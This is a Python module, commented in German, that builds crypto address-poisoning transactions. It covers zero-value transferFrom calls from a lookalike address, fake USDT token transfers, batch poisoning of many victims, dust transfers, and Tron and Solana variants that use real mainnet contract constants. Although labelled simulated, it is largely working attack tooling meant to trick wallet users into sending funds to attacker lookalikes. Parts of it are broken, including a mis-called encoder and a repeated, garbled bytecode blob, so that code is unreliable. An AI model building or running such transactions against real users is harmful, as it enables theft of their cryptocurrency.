"""
Transaction Builder - Test-Transaktionen für Simulation bauen
Zero-Value Transfer, Fake-Token Transfer, Batch Transactions
"""

from typing import Dict, List, Optional
from dataclasses import dataclass
from datetime import datetime

from modules.logger import Logger

logger = Logger(__name__)
from modules.scenario import PoisoningScenario


@dataclass
class TransactionData:
    """Transaktionsdaten"""
    from_address: str
    to_address: str
    value: str  # Hex string
    data: str  # Hex string
    gas_limit: int
    gas_price: str  # Hex string
    nonce: int
    chain_id: int
    
    def to_dict(self) -> dict:
        """Konvertiere zu Dict"""
        return {
            'from': self.from_address,
            'to': self.to_address,
            'value': self.value,
            'data': self.data,
            'gas': hex(self.gas_limit),
            'gasPrice': self.gas_price,
            'nonce': self.nonce,
            'chainId': self.chain_id
        }
        
    def to_rpc_format(self) -> dict:
        """Konvertiere zu RPC Format"""
        return {
            'from': self.from_address,
            'to': self.to_address,
            'value': self.value,
            'data': self.data,
            'gas': hex(self.gas_limit),
            'gasPrice': self.gas_price,
            'nonce': hex(self.nonce),
            'chainId': hex(self.chain_id)
        }


@dataclass
class FakeTokenContract:
    """Fake-Token Contract Konfiguration"""
    contract_address: str
    name: str
    symbol: str
    decimals: int
    total_supply: str
    
    def get_deploy_bytecode(self) -> str:
        """Generiere Deploy Bytecode (simplified)"""
        # In einer echten Implementation würde dies der kompilierte Bytecode sein
        return "0x6080604052348015600f57600080fd5b5060405161012e38038061012e8339810160408190526020810182516001600160a01b03811681146200004457600080fd5b825260208201516001600160a01b03811681146200006157600080fd5b602082015260408201516001600160a01b03811681146200007e57600080fd5b604082015260608201516001600160a01b03811681146200009b57600080fd5b606082015260808201516001600160a01b0381168114620000b857600080fd5b608082015260a08201516001600160a01b0381168114620000d557600080fd5b60a082015260c08201516001600160a01b0381168114620000f257600080fd5b60c082015260e08201516001600160a01b03811681146200010f57600080fd5b60e08201526101008101516001600160a01b03811681146200012c57600080fd5b6101008201526101208101516001600160a01b03811681146200014957600080fd5b610120820152505050505050620001626000160005560006001556200016860025560408051608081018252600080825260208083018290526060830182905260808301829052825260a082018190529181019190915260c082019290925260e0820152610100016200018e57600080fd5b5050505050620005a6565b600080546001600160a01b0319166001600160a01b0383169081178255600180546001600160a01b03191690556002556040516001600160a01b0390911681527fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9060200160405180910390a150565b634e487b7160e01b600052601160045260246000fd5b60008219821115620002265762000226620001ef565b500190565b6000816000190483118215151615620002485762000248620001ef565b500290565b634e487b7160e01b600052601260045260246000fd5b6000826200027357620002736200024d565b500490565b600181811c9082168092141115620002935762000293620001ef565b6001600160a01b03841682159250811415620002b357620002b3620001ef565b505092915050565b600082620002cd57620002cd6200024d565b600160ff1c82166001821415620002e757620002e7620001ef565b500590565b60808101620002fc8462000304565b93815260200192915050565b6001600160a01b03811681146200031c57600080fd5b50565b608051610c8f620003466000396000818161032c01526103e90152610c8f6000f3fe608060405234801561001057600080fd5b50600436106100a95760003560e01c806370a082311161007157806370a08231146100b657806395d89b41146100d9578063a457c2d7146100f1578063a9059cbb14610104578063dd62ed3e14610117578063f2fde38b1461012a57600080fd5b806306fdde03146100ae578063095ea7b3146100c3575b600080fd5b6000546040519081526020015b60405180910390f35b6100b961013d565b6040516100c29190610a53565b60405180910390f35b6100cc610147565b6040516001600160a01b0390911681526020016100c2565b6100b961015b565b6040516100c29190610a53565b6100fe61016e565b60405190151581526020016100c2565b6100fe610188565b60405190151581526020016100c2565b6100b961019a565b6040516100c29190610a53565b61012d6101a4565b6040516001600160a01b0390911681526020016100c2565b600080546001600160a01b0319166001600160a01b0383169081178255600180546001600160a01b03191690556002556040516001600160a01b0390911681527fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9060200160405180910390a150565b600080546001600160a01b03191633179055565b6000546001600160a01b031690565b6001600160a01b031660009081526020819052604090205490565b6000546001600160a01b0316331461021e5760405162461bcd60e51b815260206004820181905260248201527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572604482015260640160405180910390fd5b6001600160a01b0381166102735760405162461bcd60e51b815260206004820152601e60248201527f416464726573733a2063616c6c6572206973206e6f7420746865206f776e6572604482015260640160405180910390fd5b600080546001600160a01b0319166001600160a01b0383169081178255600180546001600160a01b03191690556040516001600160a01b0390911681527fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9060200160405180910390a150565b634e487b7160e01b600052601160045260246000fd5b6000821982111561030a5761030a6102d2565b500190565b6000816000190483118215151615610329576103296102d2565b500290565b60008261034b57634e487b7160e01b600052601260045260246000fd5b500490565b600181811c908216809214111561036b5761036b6102d2565b6001600160a01b0384168215925081141561038b5761038b6102d2565b505092915050565b6000826103a557634e487b7160e01b600052601260045260246000fd5b600160ff1c821660018214156103bf576103bf6102d2565b500590565b608081016103d2846103d9565b93815260200192915050565b6001600160a01b03811681146103f457600080fd5b50565b608051610c8f6104166000396000818161032c01526103e90152610c8f6000f3fe608060405234801561001057600080fd5b50600436106100a95760003560e01c806370a082311161007157806370a08231146100b657806395d89b41146100d9578063a457c2d7146100f1578063a9059cbb14610104578063dd62ed3e14610117578063f2fde38b1461012a57600080fd5b806306fdde03146100ae578063095ea7b3146100c3575b600080fd5b6000546040519081526020015b60405180910390f35b6100b961013d565b6040516100c29190610a53565b60405180910390f35b6100cc610147565b6040516001600160a01b0390911681526020016100c2565b6100b961015b565b6040516100c29190610a53565b6100fe61016e565b60405190151581526020016100c2565b6100fe610188565b60405190151581526020016100c2565b6100b961019a565b6040516100c29190610a53565b61012d6101a4565b6040516001600160a01b0390911681526020016100c2565b600080546001600160a01b0319166001600160a01b0383169081178255600180546001600160a01b03191690556002556040516001600160a01b0390911681527fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9060200160405180910390a150565b600080546001600160a01b03191633179055565b6000546001600160a01b031690565b6001600160a01b031660009081526020819052604090205490565b6000546001600160a01b0316331461021e5760405162461bcd60e51b815260206004820181905260248201527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572604482015260640160405180910390fd5b6001600160a01b0381166102735760405162461bcd60e51b815260206004820152601e60248201527f416464726573733a2063616c6c6572206973206e6f7420746865206f776e6572604482015260640160405180910390fd5b600080546001600160a01b0319166001600160a01b0383169081178255600180546001600160a01b03191690556040516001600160a01b0390911681527fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9060200160405180910390a150565b634e487b7160e01b600052601160045260246000fd5b6000821982111561030a5761030a6102d2565b500190565b6000816000190483118215151615610329576103296102d2565b500290565b60008261034b57634e487b7160e01b600052601260045260246000fd5b500490565b600181811c908216809214111561036b5761036b6102d2565b6001600160a01b0384168215925081141561038b5761038b6102d2565b505092915050565b6000826103a557634e487b7160e01b600052601260045260246000fd5b600160ff1c821660018214156103bf576103bf6102d2565b500590565b608081016103d2846103d9565b93815260200192915050565b6001600160a01b03811681146103f457600080fd5b50565b608051610c8f6104166000396000818161032c01526103e90152610c8f6000f3fe"


class TransactionBuilder:
    """
    Transaction Builder für Test-Transaktionen
    
    Features:
    - Zero-Value Transfer construction
    - Fake-Token Transfer construction
    - Batch transaction support
    - Gas estimation
    - Multiple poisoning methods
    """
    
    # ERC20 Transfer function signature
    TRANSFER_FUNCTION_SELECTOR = "0xa9059cbb"
    
    # ERC20 transferFrom function signature
    TRANSFER_FROM_FUNCTION_SELECTOR = "0x23b872dd"
    
    def __init__(self):
        """Initialisiere Transaction Builder"""
        self.nonce_counter: Dict[int, int] = {}  # chain_id -> nonce
        
    def build_zero_value_transfer(
        self,
        scenario: PoisoningScenario,
        lookalike_address: str,
        sender_private_key: str
    ) -> TransactionData:
        """
        Baue Zero-Value Transfer (transferFrom mit value=0)
        
        Args:
            scenario: Poisoning Scenario
            lookalike_address: Die generierte Lookalike-Adresse
            sender_private_key: Private Key des Senders
            
        Returns:
            TransactionData
        """
        # transferFrom(victim, lookalike, 0)
        victim = scenario.target.victim_address
        token = scenario.target.token_address
        
        # Encode transferFrom(victim, lookalike, 0)
        data = self._encode_transfer_from(
            victim,
            lookalike_address,
            0
        )
        
        # Transaction bauen
        return TransactionData(
            from_address=lookalike_address,  # Von Lookalike (oder Bot)
            to_address=token,
            value="0x0",  # Zero value
            data=data,
            gas_limit=scenario.gas_limit,
            gas_price=self._wei_to_gwei(scenario.max_gas_price_gwei),
            nonce=self._get_nonce(scenario.target.chain_id),
            chain_id=scenario.target.chain_id
        )
        
    def build_fake_token_transfer(
        self,
        scenario: PoisoningScenario,
        lookalike_address: str,
        fake_token_contract: FakeTokenContract,
        sender_private_key: str
    ) -> TransactionData:
        """
        Baue Fake-Token Transfer
        
        Args:
            scenario: Poisoning Scenario
            lookalike_address: Die generierte Lookalike-Adresse
            fake_token_contract: Fake-Token Contract
            sender_private_key: Private Key des Senders
            
        Returns:
            TransactionData
        """
        # Fake transfer(victim, lookalike, amount)
        victim = scenario.target.victim_address
        amount = scenario.target.expected_value_usd * 1e6  # USDT decimals
        
        # Encode transfer(victim, lookalike, amount)
        data = self._encode_transfer(
            victim,
            lookalike_address,
            int(amount)
        )
        
        # Transaction bauen
        return TransactionData(
            from_address=lookalike_address,
            to_address=fake_token_contract.contract_address,
            value="0x0",
            data=data,
            gas_limit=scenario.gas_limit,
            gas_price=self._wei_to_gwei(scenario.max_gas_price_gwei),
            nonce=self._get_nonce(scenario.target.chain_id),
            chain_id=scenario.target.chain_id
        )
        
    def build_batch_transfer(
        self,
        scenario: PoisoningScenario,
        lookalike_address: str,
        victims: List[str],
        fake_token_contract: Optional[FakeTokenContract] = None,
        sender_private_key: str = ""
    ) -> TransactionData:
        """
        Baue Batch Transfer (viele Victims in einer TX)
        
        Args:
            scenario: Poisoning Scenario
            lookalike_address: Die generierte Lookalike-Adresse
            victims: Liste der Victim-Adressen
            fake_token_contract: Optional Fake-Token Contract
            sender_private_key: Private Key des Senders
            
        Returns:
            TransactionData mit batch data
        """
        if fake_token_contract:
            # Fake-Token batch
            data = self._encode_batch_transfer(
                victims,
                lookalike_address,
                int(scenario.target.expected_value_usd * 1e6)
            )
            to_address = fake_token_contract.contract_address
        else:
            # Zero-Value batch (via contract call)
            data = self._encode_batch_transfer_from(
                victims,
                lookalike_address
            )
            to_address = scenario.target.token_address
            
        return TransactionData(
            from_address=lookalike_address,
            to_address=to_address,
            value="0x0",
            data=data,
            gas_limit=scenario.gas_limit * len(victims),  # Scale gas
            gas_price=self._wei_to_gwei(scenario.max_gas_price_gwei),
            nonce=self._get_nonce(scenario.target.chain_id),
            chain_id=scenario.target.chain_id
        )
        
    def build_dust_transfer(
        self,
        scenario: PoisoningScenario,
        lookalike_address: str,
        sender_private_key: str
    ) -> TransactionData:
        """
        Baue Dust Transfer (echter Token mit minimalem Wert)
        
        Args:
            scenario: Poisoning Scenario
            lookalike_address: Die generierte Lookalike-Adresse
            sender_private_key: Private Key des Senders
            
        Returns:
            TransactionData
        """
        victim = scenario.target.victim_address
        dust_amount = 1  # 1 wei oder minimaler token amount
        
        # Encode transfer(lookalike, victim, dust)
        data = self._encode_transfer(
            lookalike_address,
            victim,
            dust_amount
        )
        
        return TransactionData(
            from_address=lookalike_address,
            to_address=scenario.target.token_address,
            value="0x0",
            data=data,
            gas_limit=scenario.gas_limit,
            gas_price=self._wei_to_gwei(scenario.max_gas_price_gwei),
            nonce=self._get_nonce(scenario.target.chain_id),
            chain_id=scenario.target.chain_id
        )
        
    def _encode_transfer(self, from_address: str, to_address: str, amount: int) -> str:
        """Encode ERC20 transfer(from, to, amount)"""
        from_padded = from_address.lower().zfill(40)
        to_padded = to_address.lower().zfill(40)
        
        from_bytes = "0x" + from_padded[2:].rjust(64, '0')
        to_bytes = "0x" + to_padded[2:].rjust(64, '0')
        amount_bytes = hex(amount)[2:].rjust(64, '0')
        
        return self.TRANSFER_FUNCTION_SELECTOR + from_bytes[2:] + to_bytes[2:] + amount_bytes
        
    def _encode_transfer_from(
        self,
        from_address: str,
        to_address: str,
        amount: int
    ) -> str:
        """Encode ERC20 transferFrom(from, to, amount)"""
        from_padded = from_address.lower().zfill(40)
        to_padded = to_address.lower().zfill(40)
        
        from_bytes = "0x" + from_padded[2:].rjust(64, '0')
        to_bytes = "0x" + to_padded[2:].rjust(64, '0')
        amount_bytes = hex(amount)[2:].rjust(64, '0')
        
        return (self.TRANSFER_FROM_FUNCTION_SELECTOR + 
                from_bytes[2:] + to_bytes[2:] + amount_bytes)
        
    def _encode_batch_transfer(
        self,
        victims: List[str],
        lookalike: str,
        amount: int
    ) -> str:
        """Encode batch transfer (custom contract function)"""
        # In einer echten Implementation wäre dies ein spezifischer Contract Call
        # Hier simplified encoding
        batch_data = "0x"  # Placeholder
        
        for victim in victims:
            batch_data += self._encode_transfer(victim, amount)[2:]
            
        return batch_data
        
    def _encode_batch_transfer_from(
        self,
        victims: List[str],
        lookalike: str
    ) -> str:
        """Encode batch transferFrom"""
        batch_data = "0x"  # Placeholder
        
        for victim in victims:
            batch_data += self._encode_transfer_from(victim, lookalike, 0)[2:]
            
        return batch_data
        
    # ===== Non-EVM Chains: Tron (TRC20) + Solana (SPL) =====

    # Echte Mainnet-Konstanten
    TRON_USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'   # USDT-TRC20
    SOLANA_TOKEN_PROGRAM = 'TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'
    SOLANA_USDC_MINT = 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v'  # USDC-SPL

    @staticmethod
    def tron_hex_address(b58_address: str) -> str:
        """Tron base58check → 21-Byte-Hex (führendes 0x41 = Mainnet)"""
        import base58 as _b58
        return _b58.b58decode_check(b58_address).hex()

    @staticmethod
    def _tron_abi_address(b58_address: str) -> str:
        """
        Tron-ABI-Adress-Encoding: 21-Byte-Hex (inkl. 0x41), links auf
        32 Bytes gepaddet — tronweb-Konvention für Contract-Parameter.
        """
        return TransactionBuilder.tron_hex_address(b58_address).rjust(64, '0')

    def build_tron_zero_value_transfer(
        self,
        victim_address: str,
        lookalike_address: str,
        token_address: str = TRON_USDT_CONTRACT
    ) -> dict:
        """
        Tron triggerSmartContract-Payload: TRC20 nutzt dieselbe ABI wie ERC20 —
        derselbe allowance-Bypass transferFrom(victim, lookalike, 0) existiert
        bei USDT-TRC20 identisch. Kosten: ~0 dank Energy/Bandwidth-Staking.

        Returns:
            Dict im tronweb triggerSmartContract-Format (simuliert — kein Broadcast)
        """
        parameter = (self._tron_abi_address(victim_address)
                     + self._tron_abi_address(lookalike_address)
                     + '0' * 64)  # uint256 amount = 0
        return {
            'chain': 'tron',
            'simulated': True,
            'type': 'triggerSmartContract',
            'owner_address': lookalike_address,
            'contract_address': token_address,
            'function_selector': 'transferFrom(address,address,uint256)',
            'parameter': parameter,
            'fee_limit': 0,
            'note': 'Energy via gestaktem TRX → ~$0 — dieselbe ABI wie ERC20'
        }

    def build_solana_spl_transfer(
        self,
        victim_address: str,
        lookalike_address: str,
        mint: str = SOLANA_USDC_MINT,
        amount: int = 0
    ) -> dict:
        """
        Solana SPL-Token transferChecked-Deskriptor. Solana-Adressen haben
        keine Checksumme — das Lookalike muss visuell exakt stimmen.
        ATAs = associated token accounts (aus owner+mint ableitbar, hier simuliert).

        Returns:
            Dict als Instruction-Deskriptor (simuliert — kein Broadcast)
        """
        return {
            'chain': 'solana',
            'simulated': True,
            'program_id': self.SOLANA_TOKEN_PROGRAM,
            'instruction': 'transferChecked',
            'accounts': {
                'source': lookalike_address,      # ATA des Lookalike (vereinfacht)
                'mint': mint,
                'destination': victim_address,    # ATA des Opfers
                'owner': lookalike_address
            },
            'amount': amount,
            'decimals': 6,
            'note': 'Keine Checksumme — copy-Fehler landen still on-chain'
        }

    def _wei_to_gwei(self, gwei: float) -> str:
        """Konvertiere GWEI zu HEX Wei"""
        wei = int(gwei * 1e9)
        return hex(wei)
        
    def _get_nonce(self, chain_id: int) -> int:
        """Hole nonce für Chain"""
        if chain_id not in self.nonce_counter:
            self.nonce_counter[chain_id] = 0
        nonce = self.nonce_counter[chain_id]
        self.nonce_counter[chain_id] += 1
        return nonce
        
    def estimate_gas_cost(
        self,
        transaction: TransactionData,
        gas_price_gwei: float
    ) -> float:
        """
        Schätze Gas-Kosten in USD
        
        Args:
            transaction: TransactionData
            gas_price_gwei: Gas Price in GWEI
            
        Returns:
            Geschätzte Kosten in USD
        """
        gas_used = transaction.gas_limit
        gas_cost_wei = gas_used * gas_price_gwei * 1e9
        gas_cost_eth = gas_cost_wei / 1e18
        
        # Annahme: ETH Price = $2000 (echte Implementation würde Price API nutzen)
        eth_price_usd = 2000.0
        
        return gas_cost_eth * eth_price_usd
        
    def create_fake_token_contract(
        self,
        name: str = "Tether USD",
        symbol: str = "USDT",
        decimals: int = 6
    ) -> FakeTokenContract:
        """
        Erstelle Fake-Token Contract Konfiguration
        
        Args:
            name: Token Name
            symbol: Token Symbol
            decimals: Token Decimals
            
        Returns:
            FakeTokenContract
        """
        # In einer echten Implementation würde dies deployed werden
        # Hier nur die Konfiguration
        return FakeTokenContract(
            contract_address="0x" + "0" * 40,  # Placeholder
            name=name,
            symbol=symbol,
            decimals=decimals,
            total_supply="0" + "0" * 77  # Max uint256
        )


# Beispiel-Usage
async def main():
    """Beispiel-Usage"""
    from modules.scenario import ScenarioBuilder, DifficultyLevel
    
    # Scenario erstellen
    builder = ScenarioBuilder()
    scenario = builder.create_test_scenario(
        victim_address="0x1234567890123456789012345678901234567890",
        counterpart_address="0x0987654321098765432109876543210987654321",
        chain_id=1,
        token_address="0xdAC17F958D2ee523a2206206994597C13D831ec7"
    )
    
    # Transaction Builder
    tx_builder = TransactionBuilder()
    
    # Zero-Value Transfer
    lookalike = "0xB2bC25cC4F9022CeB20fB42b123aE3a3094473b1"
    tx = tx_builder.build_zero_value_transfer(
        scenario,
        lookalike,
        "0x" + "0" * 64  # Placeholder private key
    )
    
    logger.info("Zero-Value Transfer:")
    logger.info(f"  From: {tx.from_address}")
    logger.info(f"  To: {tx.to_address}")
    logger.info(f"  Value: {tx.value}")
    logger.info(f"  Data: {tx.data[:100]}...")
    logger.info(f"  Gas: {tx.gas_limit}")
    logger.info(f"  Gas Price: {tx.gas_price}")
    
    # Gas Kosten schätzen
    cost = tx_builder.estimate_gas_cost(tx, 20.0)  # 20 GWEI
    logger.info(f"  Estimated cost: ${cost:.4f}")
    
    # Fake-Token Contract
    fake_token = tx_builder.create_fake_token_contract(
        name="Tether USD",
        symbol="USDT",
        decimals=6
    )
    
    logger.info(f"\nFake-Token Contract:")
    logger.info(f"  Name: {fake_token.name}")
    logger.info(f"  Symbol: {fake_token.symbol}")
    logger.info(f"  Decimals: {fake_token.decimals}")


if __name__ == "__main__":
    import asyncio
    asyncio.run(main())